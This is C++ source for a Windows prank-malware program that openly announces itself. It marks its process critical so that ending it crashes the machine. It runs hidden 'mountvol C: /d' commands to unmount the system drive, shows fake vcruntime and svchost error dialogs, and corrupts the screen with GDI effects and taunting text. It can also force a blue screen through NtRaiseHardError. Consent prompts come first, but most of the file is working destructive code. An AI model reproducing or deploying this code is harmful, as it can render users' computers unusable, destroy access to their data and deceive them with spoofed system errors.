//#pragma comment(lib, "Winmm.lib")

#ifdef UNICODE
#undef UNICODE
#endif

#include <iostream>
#include <Windows.h>
#include <math.h>
#include <random>

#include "payloads.h"

typedef NTSTATUS(NTAPI* fnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI* fnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* fnNtSetInformationProcess)(HANDLE hProcess, ULONG ulClassInfo, PVOID pProcessInformation, ULONG pProcessInformationSize);

typedef int (*functionarray) ();

DWORD WINAPI audio(LPVOID lpParam) {
    while (true) {
        Sleep(rand() % 10000);
        Beep(rand() % 2000, rand() % 5000);
    }
    ExitThread(0);
}

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, INT nCmdShow) {
    if (MessageBoxW(NULL, L"This program contains rapid flashing lights and loud audio. Are you sure you want to continue?", L"WARNING", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
    {
        ExitProcess(0);
    }

    BOOL crash = FALSE;

    if (MessageBoxW(NULL, L"Would you like this program to crash your computer or no?", L"Crash?", MB_YESNO | MB_ICONEXCLAMATION) == IDYES) {
        crash = TRUE;
    }

    functionarray payloads[] = {
        NULL,
        p1,
        p2,
        p3
    }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h

    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    fnRtlAdjustPrivilege RtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    fnNtRaiseHardError NtRaiseHardError = (fnNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
    fnNtSetInformationProcess NtSetInformationProcess = (fnNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
    
    BOOLEAN bOld1;
    ULONG ulBreakOnTermination1 = 1;
    RtlAdjustPrivilege(20, TRUE, FALSE, &bOld1);
    NtSetInformationProcess(GetCurrentProcess(), 0x1D, &ulBreakOnTermination1, sizeof(ULONG));

    MSGBOXPARAMS msglol = { 0 };
    msglol.cbSize = sizeof(MSGBOXPARAMS);
    msglol.hwndOwner = NULL;
    msglol.hInstance = GetModuleHandle(NULL);
    msglol.lpszText = "Cannot find vcruntime140.dll. Click OK to terminate the program.";
    msglol.lpszCaption = "Fatal error in Xytharis.exe";
    msglol.dwStyle = MB_OK | MB_ICONHAND;
    HANDLE hmsg1 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msglol, NULL, NULL);

    //rick roll
    //ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_SHOWDEFAULT);

    /*if (playmusic) {
        HANDLE music = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Music, NULL, 0, NULL))
    } //add music soon, get better method*/

    HANDLE hAudio = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)audio, NULL, 0, NULL);

    ShellExecuteA(NULL, "open" "C:\\Windows\\System32\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);
    ShellExecuteA(NULL, "open" "C:\\Windows\\sysnative\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);

    Sleep(10000);

    MSGBOXPARAMS msg2 = {0};
    msg2.cbSize = sizeof(MSGBOXPARAMS);
    msg2.hwndOwner = NULL;
    msg2.hInstance = GetModuleHandle(NULL);
    msg2.lpszText = "Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA";
    msg2.lpszCaption = "Your computer is mine now";
    msg2.dwStyle = MB_OK | MB_ICONHAND;
    HANDLE hmsg2 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, NULL, NULL);

    MSGBOXPARAMS msg1 = { 0 };
    msg1.cbSize = sizeof(MSGBOXPARAMS);
    msg1.hwndOwner = NULL;
    msg1.hInstance = GetModuleHandle(NULL);
    msg1.lpszText = "Error in application \"svchost.exe\": terminating...";
    msg1.lpszCaption = "Error";
    msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
    HANDLE hmsg3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, NULL, NULL);

    //p1();

    p2();

    //i have no idea what this does
    HWND desktop = GetDesktopWindow();
    RECT rect;
    GetWindowRect(desktop, &rect);
    INT w = rect.right - rect.left;
    INT h = rect.bottom - rect.top;
    HDC desk = GetDC(NULL);
    PatBlt(desk, rand() % 100, rand() % 100, w, h, DSTINVERT);

    INT sw = GetSystemMetrics(SM_CXSCREEN);
    INT sh = GetSystemMetrics(SM_CYSCREEN);
    SelectObject(desk, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));

    fori(100) {
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, 0x9273ecef);
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, PATINVERT);
    }
    
    // SetPixel is slow
    //random pixels all over the place
    fori(100) {
        CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutA(desk, rand() % w, rand() % h, "HAHAHAH UR SCREWED", 18);
        Rectangle(desk, rand() % w, rand() % h, rand() % w, rand() % h);
        Sleep(50);
    }

    MSGBOXPARAMS msg5 = { 0 };
    msg5.cbSize = sizeof(MSGBOXPARAMS);
    msg5.hwndOwner = NULL;
    msg5.hInstance = GetModuleHandle(NULL);
    msg5.lpszText = "that was only round 1, have a little braek";
    msg5.lpszCaption = "get ready";
    msg5.dwStyle = MB_YESNO | MB_ICONQUESTION;
    HANDLE hmsg4 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg5, NULL, NULL);

    Sleep(10000);
    Ellipse(desk, rand() % w, rand() % h, rand() % w, rand() % h);
    fori(50) {
        INT y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 8);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
        SelectObject(desk, brush);
        BitBlt(desk, 0, y, 100, h, desk, rand() % 96 - 56, y, SRCCOPY);
        PatBlt(desk, -1, y, 100, h, PATINVERT);
        Sleep(rand() % 1234);
    }

    HRGN hRegion = CreateRectRgn(0, 0, w, h);

    fori(50) {
        LineTo(desk, rand() % w, rand() % h);
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        InvertRgn(desk, hRegion);
        Sleep(50);
    }

    fori(1000) {
        i += 5;
        BitBlt(desk, sin(i) * 5, cos(i) * i, sw, h, desk, rand() % i * 50, rand() % i * 50, 0x00D80745);
    } 

    fori(50) {
        
    }

    ReleaseDC(NULL, desk);
    CloseHandle(hmsg1);
    CloseHandle(hmsg2);
    CloseHandle(hmsg3);
    CloseHandle(hmsg4);

    TerminateThread(hAudio, 1); //literally not safe
    CloseHandle(hAudio);

    //crash
    if (crash) {
        BOOLEAN bOld2;
        ULONG ulResponse;
        RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
        NtRaiseHardError(0xC0000350, NULL, NULL, NULL, 6, &ulResponse);
        FreeLibrary(ntdll);
    }
    return 0;
}
